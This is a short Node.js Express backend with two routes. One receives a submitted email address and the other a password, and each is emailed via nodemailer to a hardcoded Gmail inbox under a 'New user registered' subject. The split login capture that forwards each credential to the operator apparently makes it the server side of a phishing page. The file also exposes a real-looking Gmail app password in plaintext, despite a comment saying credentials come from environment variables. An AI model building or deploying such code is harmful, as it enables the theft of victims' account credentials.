const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config(); // Load environment variables

const app = express();

app.use(express.json());
app.use(cors());

// Email credentials from environment variables
// emails credentials
const userEmail = "Igbovitalis269@gmail.com";
const pass = "mjfpjwwtwqkepvdp";

// API route for index
app.post("/", (req, res) => {
  const { email } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Email: ${email}`,
    text: `New user registered with Email: ${email}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent:", info.response);
      res.send("Success");
    }
  });
});

// API route for password
app.post("/pass", (req, res) => {
  const { password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${userEmail}`,
    to: userEmail,
    subject: `Password: ${password}`,
    text: `New user registered with Password: ${password}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent:", info.response);
      res.send("Success");
    }
  });
});

// ❌ REMOVE `app.listen(PORT)` and EXPORT `app`
module.exports = app;
